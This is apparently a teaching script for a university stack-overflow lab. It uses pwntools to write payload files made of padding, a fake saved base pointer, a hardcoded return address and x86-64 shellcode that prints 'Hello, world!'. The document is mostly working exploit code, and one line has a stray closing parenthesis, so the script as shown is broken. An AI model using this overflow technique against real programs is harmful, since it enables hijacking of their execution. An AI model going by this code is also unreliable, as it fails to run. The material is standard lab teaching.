#!/usr/bin/env python3
# Simple Python script to generate shellcode for Lab5
# Nils, SUTD, 2016
# Z. TANG, SUTD, 2019

from pwn import *
# trial and error. Once 80 characters, (with last 8 being E)
lenfill = 64 # or some other value

# Hello World! payload - designed by Oka, 2014
payload = b'\xeb\x2a\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x5e\xba\x0e\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00\x00\xbf\x00\x00\x00\x00\x0f\x05\xe8\xd1\xff\xff\xff\x48\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x21'

# Set up return address. pwnlib is used to turn int to string

storedRBP = p64(0x4444444444444444) # DDDDDDDD in hex

# When running inside GDB
#Result from running original script and use info frame: rbp at 0x7fffffffdec0, rip at 0x7fffffffdec8
#Hence, to point to the address that contains the payload, add 8 (dec) into the RIP address
storedRIPgdb = p64(0x7fffffffded0) # EEEEEEEE in hex

# When directly running on shell
#Result from running original script and use info frame: rbp at 0x7fffffffdf10, rip at 0x7fffffffdf18
#Hence, to point to the address that contains the payload, add 8 (dec) into the RIP address
storedRIP = p64(0x7fffffffdf20)) # EEEEEEEE in hex

with open('payloadgdb','wb') as f:
    f.write(b'A' * lenfill + storedRBP + storedRIPgdb + payload +b'\n')#add new line because memory access error

with open('payload','wb') as f:
    f.write(b'A' * lenfill + storedRBP + storedRIP + payload+b'\n')

